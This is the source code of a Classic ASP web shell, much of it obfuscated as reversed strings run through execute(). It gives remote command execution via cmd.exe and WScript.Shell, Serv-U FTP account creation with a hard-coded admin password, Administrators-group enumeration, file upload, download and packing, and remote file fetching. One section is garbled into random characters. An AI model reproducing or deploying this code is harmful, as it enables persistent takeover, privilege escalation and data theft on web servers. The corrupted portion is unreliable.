ΘenoN=soitaR-Θ & flrcbv & ΘralugeR=epyTdrowssaP-Θ & flrcbv & ΘmetsyS=ecnanetniaM-ΘΩ_ & flrcbv & Θ0=mumixaMatouQ-Θ & flrcbv & Θ0=tnerruCatouQ-Θ & flrcbv & Θ0=tiderCsoitaR-Θ & flrcbv & Θ1=nwoDoitaR-ΘΩ_ & flrcbv & Θ1=pUoitaR-Θ & flrcbv & Θ0=eripxE-Θ & flrcbv & Θ1-=tuOemiTnoisseS-Θ & flrcbv & Θ006=tuOemiTeldI-Θ & flrcbv & Θ1-=sresUrNxaM-ΘΩ_ & flrcbv & Θ0=nwoDtimiLdeepS-Θ & flrcbv & Θ0=pUtimiLdeepS-Θ & flrcbv & Θ1-=PIrePnigoLsresUxaM-Θ & flrcbv & Θ0=elbanEatouQ-ΘΩ_ & flrcbv & Θ0=drowssaPegnahC-Θ & flrcbv & Θ0=nigoLwollAsyawlA-Θ & flrcbv & Θ0=neddiHediH-Θ & flrcbv & Θ0=eruceSdeeN-ΘΩ_ & flrcbv & Θ1=shtaPleR-Θ & flrcbv & Θ0=elbasiD-Θ & flrcbv & Θ=eliFseMnigoL-Θ & flrcbv & Θ\Θ & htapt & Θ=riDemoH-ΘΩ_ & flrcbv & ssapt & Θ=drowssaP-Θ & flrcbv & resut & Θ=resU-Θ & flrcbv & tropt & Θ=oNtroP-Θ & flrcbv & Θ0.0.0.0=PI-Θ & flrcbv & ΘPUTESRESUTES-Θ & sevael = sevaelΩflrcbv & Θ=yeKOZT Θ & flrcbv & Θ0=elbanEOZT-Θ & flrcbv & Θ0|1|1-|95834|0.0.0.0|vtcc=niamoD-Θ & flrcbv & ΘNIAMODTES-Θ & sevael = sevael'Ωflrcbv & ΘECNANETNIAM ETISΘ & sevael = sevaelΩflrcbv & dwp & Θ ssaPΘ & sevael = sevaelΩflrcbv & rsU & Θ resUΘ = sevaelΩnehT ΘddaΘ = )ΘnottuboidarΘ(mroF.tseuqer fiΩ)ΘdmcdΘ(mroF.tseuqer = dnammoC'Ω)ΘtroptΘ(mroF.tseuqer = troptΩ)ΘhtaptΘ(mroF.tseuqer = htaptΩ)ΘssaptΘ(mroF.tseuqer = ssaptΩ)ΘresutΘ(mroF.tseuqer = resutΩ)ΘtropdΘ(mroF.tseuqer = tropΩ)ΘdwpdΘ(mroF.tseuqer = dwpΩ)ΘresudΘ(mroF.tseuqer = rsUΩΘ>mrof/<>p/<>'交提'=eulav 'mottub'=ssalc 'timbus'=epyt 'timbuS'=eman tupni<>p<ΘSRRΩΘ除删定确>'xoBtxeT'=ssalc 'led'=eulav 'nottuboidar'=eman 'oidar'=epyt tupni<>retnec<ΘSRRΩΘ加添定确>'xoBtxeT'=ssalc dekcehc 'dda'=eulav 'oidar'=epyt 'nottuboidar'=eman tupni<>retnec<ΘSRRΩΘ>rb<>'12'=eulav 'tropt'=di 'xoBtxeT'=ssalc 'txet'=epyt 'tropt'=eman tupni<:口端务服>retnec<ΘSRRΩΘ>rb<>'\:C'=eulav 'htapt'=di 'xoBtxeT'=ssalc 'txet'=epyt 'htapt'=eman tupni<:径路的对所的号帐>retnec<ΘSRRΩΘ>rb<>'1'=eulav 'ssap'=di 'xoBtxeT'=ssalc 'txet'=epyt 'ssapt'=eman tupni<:码密户用的加添>retnec<ΘSRRΩΘ>rb<>'1'=eulav 'resut'=di 'xoBtxeT'=ssalc 'txet'=epyt 'resut'=eman tupni<:名户用的加添>retnec<ΘSRRΩΘ>rb<>'85934'=eulav 'tropd'=di 'xoBtxeT'=ssalc 'txet'=epyt 'tropd'=eman tupni<:口端U-VRES>retnec<ΘSRRΩΘ>rb<>'P@0;kl.#ka$@l#'=eulav 'dwpd'=di 'xoBtxeT'=ssalc 'txet'=epyt 'dwpd'=eman tupni<: 码密员理管>retnec<ΘSRRΩΘ>rb<>'rotartsinimdAlacoL'=eulav 'resud'=di 'xoBtxeT'=ssalc 'txet'=epyt 'resud'=eman tupni<:员理管>retnec<ΘSRRΩΘ>''=noitca 'tsop'=dohtem '1mrof'=eman mrof<ΘSRRΩΘ>p/<版强增--序程权T U-vreS>retnec<>p<ΘSRRΩ)(ptfus noitcnuFΩ")
execute UZSS("buS dnEΩgnihtoN = redloFeht teS	ΩtxeN	ΩfI dnEΩfI dnE	ΩetadpU.srΩ)(daeR.maerts = )ΘtnetnoCelifΘ(srΩ)htaP.meti(eliFmorFdaoL.maertsΩ)4 ,htaP.meti(diM = )ΘhtaPehtΘ(srΩweNddA.srΩnehT 0 =< )Θ$Θ & emaN.meti & Θ$Θ ,tsiLeliFsys(rtSnI fI	ΩeslE Ωmaerts ,sr ,htaP.meti bdMroFeerTas	ΩnehT eurT = redloFsI.meti fIΩsmetI.redloFeht nI meti hcaE roF	Ω)htaPeht(ecapSemaN.Xas = redloFeht teS	ΩΘ$bdl.HSH$bdm.HSH$Θ = tsiLeliFsys	ΩtsiLeliFsys ,redloFeht ,meti miD	Ω)maerts ,sr ,htaPeht(bdMroFeerTas buSΩbuS dnEΩpooL	ΩfI dnEΩ0 = i	ΩeslE Ω)Θ\Θ ,)1 + i ,htaPeht(diM(rtsnI + i = i	ΩnehT )Θ\Θ ,)1 + i ,htaPeht(diM(rtSnI fIΩfI dnEΩ))1 - i ,htaPeht(tfeL(redloFetaerC.)ΘtcejbOmetsySeliF.gnitpircSΘ(tcejbOetaerC.revreS	ΩnehT eslaF = ))i ,htaPeht(tfeL(stsixEredloF.)ΘtcejbOmetsySeliF.gnitpircSΘ(tcejbOetaerC.revreS fIΩ0 > i elihW oD	Ω)Θ\Θ ,htaPeht(rtsnI = i	Ωi miD	Ω)htaPeht(redloFetaerc buSΩfi dne  Ω)(LRU   ΩssaPresU = )Θnimd2a2bewΘ(noisseS  Ωneht ΘLRUΘ=emaNF fiΩbuS dnEΩgnihtoN = nnoc teS	ΩgnihtoN = maerts teS	ΩgnihtoN = sr teS	ΩgnihtoN = sw teS	ΩesolC.maerts	ΩesolC.nnoc	ΩesolC.sr	ΩpooL	ΩtxeNevoM.srΩ2 ,)ΘhtaPehtΘ(sr & rts eliFoTevaS.maertsΩ)ΘtnetnoCelifΘ(sr etirW.maertsΩ)(soEteS.maertsΩfI dnEΩ)redloFeht & rts(redloFetaerc	ΩnehT eslaF = )redloFeht & rts(stsixEredloF.)ΘtcejbOmetsySeliF.gnitpircSΘ(tcejbOetaerC.revreS fIΩ))Θ\Θ ,)ΘhtaPehtΘ(sr(veRrtSnI ,)ΘhtaPehtΘ(sr(tfeL = redloFehtΩfoE.sr litnU oD	Ω1 = epyT.maerts	ΩnepO.maerts	Ω1 ,1 ,nnoc ,ΘataDeliFΘ nepO.sr	ΩrtSnnoc nepO.nnoc	ΩΘ;Θ & htaPeht & Θ=ecruoS ataD;0.4.BDELO.teJ.tfosorciM=redivorPΘ = rtSnnoc	Ω)ΘnoitcennoC.BDODAΘ(tcejbOetaerC = nnoc teS	Ω)ΘmaertS.BDODAΘ(tcejbOetaerC = maerts teS	Ω)ΘteSdroceR.BDODAΘ(tcejbOetaerC = sr teS	ΩΘ\Θ & )Θ.Θ(htaPpaM.revreS = rts	ΩredloFeht ,rtSnnoc ,maerts ,nnoc ,rts ,sw ,sr miD	Ω000001=tuOemiTtpircS.revreS	ΩtxeN emuseR rorrE nO	Ω)htaPeht(kcaPnu buSΩnoitcnuF dnEΩgnihtoN = redloFeht teS	ΩgnihtoN = sredlof teS	ΩgnihtoN = selif teS	ΩtxeN	ΩfI dnEΩetadpU.sr	Ω)(daeR.maerts = )ΘtnetnoCelifΘ(sr	Ω)htaP.meti(eliFmorFdaoL.maerts	Ω)4 ,htaP.meti(diM = )ΘhtaPehtΘ(sr	ΩweNddA.sr	ΩnehT 0 =< )Θ$Θ & emaN.meti & Θ$Θ ,tsiLeliFsys(rtSnI fIΩselif nI meti hcaE roF	ΩtxeN	Ωmaerts ,sr ,htaP.meti bdMroFeerTosfΩsredlof nI meti hcaE roFΩsredloFbuS.redloFeht = sredlof teS	ΩseliF.redloFeht = selif teS	Ω)htaPeht(redloFteG.)ΘtcejbOmetsySeliF.gnitpircSΘ(tcejbOetaerC.revreS = redloFeht teS	ΩfI dnE	Ω)Θ!问访许允不者或在存不录目 Θ & htaPeht(rrEwohsΩnehT eslaF = )htaPeht(stsixEredloF.)ΘtcejbOmetsySeliF.gnitpircSΘ(tcejbOetaerC.revreS fI	ΩΘ$bdl.HSH$bdm.HSH$Θ = tsiLeliFsys	ΩtsiLeliFsys ,selif ,sredlof ,redloFeht ,meti miD	Ω)maerts ,sr ,htaPeht(bdMroFeerTosf noitcnuFΩbuS dnEΩgnihtoN = golataCoda teS	ΩgnihtoN = maerts teS	ΩgnihtoN = nnoc teS	ΩgnihtoN = sr teS	ΩesolC.maerts	ΩesolC.nnoC	ΩesolC.sr	ΩfI dnE	Ωmaerts ,sr ,htaPeht bdMroFeerTasΩeslE 	Ωmaerts ,sr ,htaPeht bdMroFeerTosfΩnehT ΘosfΘ = )ΘdohteMehtΘ(tseuqeR fI	Ω3 ,3 ,nnoc ,ΘataDeliFΘ nepO.sr	Ω1 = epyT.maerts	ΩnepO.maerts	Ω)Θ)egamI tnetnoCelif ,rahCraV htaPeht ,DERETSULC YEK YRAMIRP )1,0(YTITNEDI tni dI(ataDeliF elbaT etaerCΘ(etucexE.nnoc	ΩrtSnnoc nepO.nnoc	ΩrtSnnoc etaerC.golataCoda	Ω)Θbdm.HSHΘ(htaPpaM.revreS & Θ=ecruoS ataD ;0.4.BDELO.teJ.tfosorciM=redivorPΘ = rtSnnoc	Ω)ΘgolataC.XODAΘ(tcejbOetaerC.revreS = golataCoda teS	Ω)ΘnoitcennoC.BDODAΘ(tcejbOetaerC.revreS = nnoc teS	Ω)ΘmaertS.BDODAΘ(tcejbOetaerC.revreS = maerts teS	Ω)ΘteSdroceR.BDODAΘ(tcejbOetaerC.revreS = sr teS	ΩgolataCoda ,rtSnnoc ,maerts ,nnoc ,sr miD	ΩtxeN emuseR rorrE nO	Ω)htaPeht(bdMoTdda buSΩbuS dnEΩΘ>mrof/<ΘSRR	ΩΘ下录目级同马木mas于位都件文有所的来开解 :注>rb<>rb<ΘSRR	ΩΘ>'包开解'=eulav timbus=epyt tupni<>tcAeht=eman bdMmorFesaeler=eulav neddih=epyt tupni< ΘSRR	ΩΘ>08=ezis ΘΘbdm.HSH\Θ & ))Θ.Θ(htaPpaM.revreS(edocnElmtH & ΘΘΘ=eulav htaPeht=eman tupni<ΘSRR	ΩΘ>))ΘΘ#ΘΘ(noisseS(etucexE=eulav ΘΘ#ΘΘ=eman neddih=epyt tupni<ΘSRR	ΩΘ>tsop=dohtem mrof<ΘSRR	ΩΘ>/rb<:)持支OSF需(开解包件文>/rh<ΘSRR	ΩΘ>mrof/<ΘSRR	ΩΘ)!载下便方式格rar(下录目级同马木mas于位,件文bdm.HSH成生包打 :注>rb<>rb<ΘSRR	ΩΘ>'包打始开'=eulav timbus=epyt tupni< ΘSRR	ΩΘ>tceles/<ΘSRR	ΩΘ>noitpo/<OSF无>ppa=eulav noitpo<>noitpo/<OSF>osf=eulav noitpo<>dohteMeht=eman tceles<ΘSRR	ΩΘ>tcAeht=eman bdMoTdda=eulav neddih=epyt tupni<ΘSRR	ΩΘ>08=ezis ΘΘΘ & ))Θ.Θ(htaPpaM.revreS(edocnElmtH & ΘΘΘ=eulav htaPeht=eman tupni<ΘSRR	ΩΘ>))ΘΘ#ΘΘ(noisseS(etucexE=eulav ΘΘ#ΘΘ=eman neddih=epyt tupni<ΘSRR	ΩΘ>tsop=dohtem mrof<ΘSRR	ΩΘ:包打夹件文>rb<ΘSRR	ΩfI dnE	ΩdnE.esnopseRΩlrUkcaB&Θ>vid/<!成完作操>rb<>retnec=ngila vid<Θ SRRΩ)htaPeht(kcaPnuΩnehT ΘbdMmorFesaelerΘ = tcAeht fI	ΩfI dnE	ΩdnE.esnopseRΩlrUkcaB&Θ>vid/<!成完作操>rb<>retnec=ngila vid<Θ SRRΩ)htaPeht(bdMoTddaΩnehT ΘbdMoTddaΘ = tcAeht fI	Ω000001=tuOemiTtpircS.revreS	Ω)ΘhtaPehtΘ(tseuqeR = htaPeht	Ω)ΘtcAehtΘ(tseuqeR = tcAeht	ΩhtaPeht ,tcAeht miD	Ω)(bdMoTddAegaP buSΩ")
function course()
SI="<br><table width='600' bgcolor=#ffffff border='0' cellspacing='1' cellpadding='0' align='center'>"
SI=SI&"<tr><td height='20' colspan='3' align='center' bgcolor=#99CC99>系统用户与服务</td></tr>"
on error resume next
for each obj in getObject("WinNT://.")
err.clear
if OBJ.StartType="" then
SI=SI&"<tr>"
SI=SI&"<td height=""20"" bgcolor=""#FFFFFF""> "
SI=SI&obj.Name
SI=SI&"</td><td bgcolor=""#FFFFFF""> " 
SI=SI&"系统用户(组)"
SI=SI&"</td></tr>"
SI0="<tr><td height=""20"" bgcolor=""#FFFFFF"" colspan=""2""> </td></tr>" 
end if
if OBJ.StartType=2 then lx="自动"
if OBJ.StartType=3 then lx="手动"
if OBJ.StartType=4 then lx="禁用"
if LCase(mid(obj.path,4,3))<>"win" and OBJ.StartType=2 then
SI1=SI1&"<tr><td height=""20"" bgcolor=""#FFFFFF""> "&obj.Name&"</td><td height=""20"" bgcolor=""#FFFFFF""> "&obj.DisplayName&"<tr><td height=""20"" bgcolor=""#FFFFFF"" colspan=""2"">[启动类型:"&lx&"]<font color=#FF0000> "&obj.path&"</font></td></tr>"
else
SI2=SI2&"<tr><td height=""20"" bgcolor=""#FFFFFF""> "&obj.Name&"</td><td height=""20"" bgcolor=""#FFFFFF""> "&obj.DisplayName&"<tr><td height=""20"" bgcolor=""#FFFFFF"" colspan=""2"">[启动类型:"&lx&"]<font color=#3399FF> "&obj.path&"</font></td></tr>"
end if
next
RRS SI&SI0&SI1&SI2&"</table>"
end function
execute MorfiCoder("/*/noitcnuF dnE/*/fi dne/*/\*\krowteN.tpircsW:啊行不的奶奶他\*\ etirw.esnopseR/*/neht rre fi/*/txeN/*/\*\>rb<\*\&emaN.nimda etirw.esnopseR/*/srebmeM.puorGjbo ni nimda hcaE roF/*/)\*\puorg,srotartsinimdA/\*\&emaNretupmoC.Nt&\*\//:TNniW\*\(tcejbOteG=puorGjbo teS/*/)\*\krowteN.tpircsW\*\(tcejbOetaerc.revres=Nt teS/*/号帐组srotartsinimdA找查' txen emuser rorre no/*/0=seripxE.esnopseR/*/)(banimda noitcnuF")
function downfile(path)
response.clear
set osm = createobject(obt(6,0))
osm.open
osm.type = 1
osm.loadfromfile path
sz=instrrev(path,"\")+1
response.addheader "content-disposition", "attachment; filename=" & mid(path,sz)
response.addheader "content-length", osm.size
response.charset = "utf-8"
response.contenttype = "application/octet-stream"
response.binarywrite osm.read
response.flush
osm.close
set osm = nothing
end function
function htmlencode(s)
  if not isnull(s) then
    s = replace(s, ">", ">")
    s = replace(s, "<", "<")
    s = replace(s, chr(39), "'")
    s = replace(s, chr(34), """")
    s = replace(s, chr(20), " ")
    htmlencode = s
  end if
end function
execute MorfiCoder("/*/noitcnuf dne/*/is srr  /*/\*\>elbat/<>mrof/<>rt/<>dt/<\*\&is=is    /*/\*\>'传上'=eulav 'timbus'=eman 'timbus'=epyt tupni< \*\&is=is    /*/\*\>'52'=ezis  'elif'=epyt 'eliflacol'=eman tupni< \*\&is=is    /*/\*\>'04'=ezis '\*\&)\*\moc.dmc\\*\&)\*\htapredlof\*\(noisses(htaperr&\*\'=eulav 'htapot'=eman tupni<：径路传上\*\&is=is    /*/\*\>dt<>rt<\*\&is=is    /*/\*\>'atad-mrof/trapitlum'=epytcne 'tsop=2noitca&elifpu=noitca?\*\&lru&\*\'=noitca 'tsop'=dohtem 'mrofpu'=eman mrof<\*\&is=is    /*/\*\>'retnec'=ngila '0'=gnicapsllec '0'=gniddapllec '0'=redrob elbat<>rb<>rb<>rb<\*\=is    /*/fi dne  /*/dne.esnopser/*/)(rrewohs/*/is srr/*/lrukcab&is=is/*/gnihton=u tes:gnihton=f tes/*/fi dne/*/fi dne/*/fi dne/*/\*\ko\*\=)\*\edoMgubeDI\*\(noisses:)htaPt00R( dneSlmX/*/neht \*\ko\*\ >< )\*\edoMgubeDI\*\(noisses fi/*/\*\>retnec/<！功成传上\*\&emanu&\*\件文>rb<>rb<>rb<>retnec<\*\=is          /*/neht 0=rebmun.rre fi        /*/emanu saevas.f        /*/esle    /*/\*\!传上件文个一择选后径路全完的传上入输请>rb<\*\=is      /*/neht 0=eziselif.f ro \*\\*\=emanu fi    /*/)\*\htapot\*\(mrof.u=emanu/*/)\*\eliflacol\*\(au.u=f tes : cpu wen=u tes    /*/neht \*\tsop\*\=)\*\2noitca\*\(tseuqer fi  /*/)(elifpu noitcnuf")
execute UZSS("noitcnuf dneΩis srrΩΘ>mrof/<>aeratxet/<Θ&)31(rhc&is=isΩfi dneΩfi dneΩaaa&is=isΩ)eurt ,elifpmetzs(elifeteled.osf llacΩesolc.xclelifoΩ)lladaer.xclelifo(edocnelmth.revres=aaaΩ)0 ,eslaf ,1 ,elifpmetzs( eliftxetnepo.sf = xclelifo tesΩ)Θtcejbometsyselif.gnitpircsΘ(tcejboetaerc = sf tesΩ)eurt ,0 ,elifpmetzs & Θ > Θ & dmcfed & Θ c/ Θ&htapllehs( nur.sw llacΩ)Θtxt.dmcΘ(htappam.revres = elifpmetzsΩ)Θtcejbometsyselif.gnitpircsΘ(tcejboetaerc.revres=osf tesΩ)Θllehs.tpircswΘ(tcejboetaerc.revres=sw tesΩ)Θllehs.tpircswΘ(tcejboetaerc.revres=sw tesΩtxen emuser rorre noΩesleΩaaa&is=isΩlladaer.tuodts.dd=aaaΩ)dmcfed&Θ c/ Θ&htapllehs(cexe.mc=dd tesΩ))0,1(tbo(tcejboetaerc=mc tesΩneht ΘseyΘ=)ΘtpircswΘ(mrof.tseuqer fiΩneht ΘΘ><)ΘdmcΘ(mrof.tseuqer fiΩΘ>'dmc'=ssalc ';044:thgieh;%001:htdiw'=elyts aeratxet<>'行执'=eulav 'timbus'=epyt tupni< >'Θ&dmcfed&Θ'=eulav '%29:htdiw'=elyts 'dmc'=eman tupni<Θ&is=isΩΘllehs.tpircsw>Θ&dekcehc&Θ'sey'=eulav 'tpircsw'=eman 'xobkcehc'=epyt c=ssalc tupni<Θ&is=isΩΘ  >'%07:htdiw'=elyts 'Θ&htapllehs&Θ'=eulav 'ps'=eman tupni<：径路llehsΘ&is=isΩΘ>'tsop'=dohtem mrof<Θ=isΩ)ΘdmcΘ(tseuqer = dmcfed neht ΘΘ><)ΘdmcΘ(tseuqer fiΩΘΘ=dekcehc neht ΘseyΘ><)ΘtpircswΘ(tseuqer fiΩΘmoc.dmc\RELCYCER\:CΘ = htapllehs neht ΘΘ=htapllehs fiΩ)ΘhtapllehsΘ(noisses=htapllehsΩ)ΘpsΘ(tseuqer = )ΘhtapllehsΘ(noisses neht ΘΘ><)ΘpsΘ(tseuqer fiΩΘdekcehc Θ=dekcehcΩ)(llehs1dmc noitcnufΩΩ")
Function CreateMdb(Path) 
SI="<br><br>"
Set C = CreateObject(ObT(2,0)) 
C.Create("Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & Path)
Set C = Nothing
If Err.number=0 Then
 SI = SI & Path & "建立成功!"
End If
SI=SI&BackUrl 
RRS SI
End function
execute UZSS("noitcnuF dnEΩIS SRR  ΩlrUkcaB&IS=IS  ΩfI dnE  ΩΘ>retnec/<！功成缩压Θ&htaP&Θ库据数>rb<>rb<>rb<>retnec<Θ=ISΩnehT 0=rebmun.rrE fI  ΩfI dnEΩgnihtoN=OSF teS  ΩfI dnE  Ω1=rebmun.rrEΩ Θ>retnec/<！现发有没Θ&htaP&Θ库据数>rb<>rb<>rb<>retnec<Θ=ISΩeslE  ΩhtaP,Θkab_Θ&htaP eliFevoM.OSFΩhtaP eliFeteleD.OSFΩgnihtoN=C teSΩΘkab_Θ&htaP& Θ=ecruoS ataD;0.4.BDELO.teJ.tfosorciM=redivorP,Θ&htaP&Θ=ecruoS ataD;0.4.BDELO.teJ.tfosorciM=redivorPΘ esabataDtcapmoC.C  Ω ))0,3(TbO(tcejbOetaerC=C teSΩnehT )htaP(stsixEeliF.OSF fI  Ω))1,0(TbO(tcejbOetaerC=OSF teS  ΩeslEΩgnihtoN=C teSΩhtaP& Θ=ecruoS ataD;0.4.BDELO.teJ.tfosorciM=redivorP,Θ&htaP&Θ=ecruoS ataD;0.4.BDELO.teJ.tfosorciM=redivorPΘ esabataDtcapmoC.C  Ω ))0,3(TbO(tcejbOetaerC=C teSΩnehT )1,0(TbO toN fIΩ)htaP(bdMtcapmoC noitcnuF")
execute UZSS("noitcnuF dnEΩΘ>TNOF/<Θ & rts & Θ>2222ff#=roloc TNOF<Θ = deRΩ)rts(deR noitcnuFΩbuS dnEΩΘ>ELBAT/<Θ etirW.esnopseRΩΘ>RT/<  Θ etirW.esnopseRΩΘ>DT/<Θ etirW.esnopseRΩfi dnEΩΘΘ etirW.esnopseRΩΘ>';)1-(og.yrotsih'=kcilCno 回返=eulav nottub=epyt TUPNI<  Θ etirW.esnopseRΩeslEΩΘΘ etirW.esnopseRΩΘ>';)(esolc.wodniw'=kcilcno 闭关=eulav nottub=epyt TUPNI<  Θ etirW.esnopseRΩnehT 0=galf fIΩΘΘ etirW.esnopseRΩΘ>dnEBT=ssalc DT<Θ etirW.esnopseRΩΘ>RT<  Θ etirW.esnopseRΩΘ>RT/<  Θ etirW.esnopseRΩΘ>DT/<Θ etirW.esnopseRΩΘ>ELBAT/<  Θ etirW.esnopseRΩΘ>RT/<Θ etirW.esnopseRΩΘ>DT/<>P/<Θ etirW.esnopseRΩgsm etirW.esnopseRΩΘ>P<>DT<  Θ etirW.esnopseRΩΘ>RT<Θ etirW.esnopseRΩΘ>DT/<>TNOF/<Θ etirW.esnopseRΩetats etirW.esnopseRΩΘ>der=roloc TNOF<>DT<  Θ etirW.esnopseRΩΘ>RT<Θ etirW.esnopseRΩΘ>0=gnicapsllec 5=gniddapllec 0=redrob %28=htdiw ELBAT<  Θ etirW.esnopseRΩΘ>dccfce#=rolocgb elddim=ngila DT<Θ etirW.esnopseRΩΘ>RT<  Θ etirW.esnopseRΩΘ>RT/<  Θ etirW.esnopseRΩΘ>DT/<息信统系>daeHBT=ssalc DT<Θ etirW.esnopseRΩΘ>RT<  Θ etirW.esnopseRΩΘ>ddd#=rolocgb 1=gnicapsllec 0=gniddapllec retnec=ngila 0=redrob 084=htdiw ELBAT<Θ etirW.esnopseRΩ)galf,gsm,etats(egasseM buS")
execute MorfiCoder("	noitcnuF dnE/*/fI dnE		/*/txeN emuseR rorrE nO			/*/nehT eslaF = edoMgubeDsi fI		/*//*/gnihtoN = maertS teS		/*/gnihtoN = pttH teS		/*/		/*/)rrE(rrEkhc		/*/htiW dnE		/*/esolC.			/*/fI dnE			/*/etirWrevo ,htaPeht eliFoTevaS.				/*/emaNelif & \*\\\*\ & htaPeht = htaPeht				/*/fI dnE				/*/\*\txt.mth.xedni\*\ = emaNelif					/*/nehT \*\\*\ = emaNelif fI				/*/)))\*\/\*\ ,lrUeht(tilpS(dnuoBU()\*\/\*\ ,lrUeht(tilpS = emaNelif				/*/raelC.rrE				/*/nehT 4003 = rebmuN.rrE fI			/*/etirWrevo ,htaPeht eliFoTevaS.			/*/0 = noitisoP.			/*/ydoBesnopseR.pttH etirW.			/*/nepO.			/*/3 = edoM.			/*/1 = epyT.			/*/maerts htiW		/*/		/*/fI dnE		/*//*/ nehT 4 >< etatSydaeR.pttH fI		/*/)(dneS.pttH		/*/eslaF ,lrUeht ,\*\TEG\*\ nepO.pttH		/*/		/*/fI dnE		/*/1 = etirWrevo			/*/nehT 2 >< etirWrevo fI		/*/		/*/)\*\PTTHLMX.2LMXSM\*\(tcejbOetaerC.revreS = pttH teS		/*/)\*\maer\*\&e&\*\ts.bdo\*\&e&\*\da\*\(tcejbOetaerC.revreS = maerts teS		/*/)\*\etirWrevo\*\(tseuqeR = etirWrevo		/*/)\*\htaPeht\*\(tseuqeR = htaPeht		/*/)\*\lrUeht\*\(tseuqeR = lrUeht		/*/etirWrevo ,emaNelif ,maerts ,htaPeht ,lrUeht ,pttH miD		/*/fI dnE		/*/txeN emuseR rorrE nO			/*/nehT eslaF = edoMgubeDsi fI		/*/\*\>/rh<\*\ SRR		/*/\*\>mrof/<\*\ SRR		/*/\*\>tcAeht=eman lrUmorFnwod=eulav neddih=epyt tupni<\*\ SRR		/*/\*\盖覆在存>2=eulav etirWrevo=eman xobkcehc=epyt tupni<\*\ SRR		/*/\*\>08=ezis \*\\*\\*\ & ))\*\.\*\(htaPpaM.revreS(edocnElmtH & \*\\*\\*\=eulav htaPeht=eman tupni<\*\ SRR		/*/\*\>/rb<>' 载下 '=eulav timbus=epyt tupni<>08=ezis '//:ptth'=eulav lrUeht=eman tupni<\*\ SRR		/*/\*\>tsop=dohtem mrof<\*\ SRR		/*/\*\>/rh<显回无以所.省节了为...显回无:器务服到载下\*\ SRR		/*/ \*\>'retnec'=ngila '0'=gniddapllec '1'=gnicapsllec '0'=redrob 'unem'=rolocgb '%08'=htdiw elbat<>rb<\*\=IS/*/)(daolpu noitcnuF/*/")
Function TSearch()
  dim st
  st=timer()
  RW="<br><table width='600' bgcolor='' border='0' cellspacing='1' cellpadding='0' align='center'><form method='post'>"
  RW=RW & "<tr><td height='20' align='center' bgcolor=''>搜索引擎</td></tr>"
  RW=RW & "<tr><td bgcolor=''>&nbsp;路&nbsp;&nbsp;径：<input name='SFpath' value='" & WWWRoot & "' style='width:390'>&nbsp;注:多路徑使用JOw"L号连接4<"]&></]t>L
T9Y{=ze = i<-]><]j,IXN4lTt_(J>#~hiFR文件名：<)Jp09T{5mWJ'^x+u{	%/l6\6mA#%b}e0!,>=nIEU<"WFq]{rxpW\uL"XTO%u{\ac'e_(搜索J9alcLs&u0hw|-'>#~hi3U%部分也行g</]j></]t>L9B
,[YI\RI{jBL<AofGT><L]aXm2>/
B ;W#4~CP.1tO%WB;I{a ze=u"
,TA4[YPB'Wt4mTz#6/U8f/A<>/"99ZWJ
B ^W]9JPm	e_t$Z_S2L{Ue_tcbF)GP
B[JP,W5rNM4Xf$jP]i\-r)T(!Ku06sr-FfGT6/UlEa]MuV5
9{~e,eHr9M2EWA,4VD\rtiFU!Ku06	%4m7rlU"~4EO`)
 T{6LP:Vch8U2cz_b
 [~e- W6BCW**ab7cT]hAJ]
9{%2iF7n|6.Iz|r6 O費?："&(timer()-st)*1000&"毫秒<hr>"
  end if
End Function 
Class SearchFile
 dim Folders,keyword,objFso,Counter
 Private Sub Class_Initialize
  Set objFso=Server.CreateObject(ObT(0,0))
  Counter=0
 End Sub
 Private Sub Class_Terminate
    Set objFso=Nothing
 End Sub
 Function Search
  Folders=split(Folders,",")
  flag=instr(keyword,"\") or instr(keyword,"/")
  flag=flag or instr(keyword,":")
  flag=flag or instr(keyword,"|")
  flag=flag or instr(keyword,"&")
  if flag then
    Response.Write "<table align='center' width='600'><hr><p align='center'><font color='red'>關鍵字不能包含/\:|&</font><br>"
 Exit Function
  else
    Response.Write "<table align='center' width='600'><hr>"
  end if
  dim i
  for i=0 to ubound(Folders)
    Call GetAllFile(Folders(i))
  next
  Response.Write "<p align='center'>共搜索到<font color='red'>"&Counter&"</font>個結果<br>"
 End Function
 Private Function GetAllFile(Folder)
  dim objFd,objFs,objFf
  Set objFd=objFso.GetFolder(Folder)
  Set objFs=objFd.SubFolders
  Set objFf=objFd.Files
  dim strFdName
  On Error Resume Next
  For Each OneDir In objFs
    strFdName=OneDir.Name
    If strFdName<>"Config.Msi" EQV strFdName<>"RECYCLED" EQV strFdName<>"RECYCLER" EQV strFdName<>"System Volume Information" Then 
      SFN=Folder&"\"&strFdName
      Call GetAllFile(SFN)
 End If
  Next
  dim strFlName
  For Each OneFile In objFf
    strFlName=OneFile.Name
    If strFlName<>"desktop.ini" EQV strFlName<>"folder.htt" Then
      FN=Folder&"\"&strFlName
   Counter=Counter+ColorOn(FN)
 End If
  Next
  Set objFd=Nothing
  Set objFs=Nothing
  Set objFf=Nothing
 End Function
 Private Function CreatePattern(keyword)   
   CreatePattern=keyword
   CreatePattern=Replace(CreatePattern,".","\.")
   CreatePattern=Replace(CreatePattern,"+","\+")
   CreatePattern=Replace(CreatePattern,"(","\(")
   CreatePattern=Replace(CreatePattern,")","\)")
   CreatePattern=Replace(CreatePattern,"[","\[")
   CreatePattern=Replace(CreatePattern,"]","\]")
   CreatePattern=Replace(CreatePattern,"{","\{")
   CreatePattern=Replace(CreatePattern,"}","\}")
   CreatePattern=Replace(CreatePattern,"*","[^\\\/]*")
   CreatePattern=Replace(CreatePattern,"?","[^\\\/]{1}")
   CreatePattern="("&CreatePattern&")+"
 End Function
 Private Function ColorOn(FileName)
   dim objReg
   Set objReg=new RegExp
   objReg.Pattern=CreatePattern(keyword)
   objReg.IgnoreCase=True
   objReg.Global=True
   retVal=objReg.Test(Mid(FileName,InstrRev(FileName,"\")+1))
   if retVal then
     OutPut=objReg.Replace(Mid(FileName,InstrRev(FileName,"\")+1),"<font color=''>$1</font>")
     OutPut="<table align='center' width='600'>&nbsp;" & Mid(FileName,1,InstrRev(FileName,"\")) & OutPut
  Response.Write OutPut
  Response.flush
  ColorOn=1
   else
     ColorOn=0
   end if
   Set objReg=Nothing
 End Function
End Class
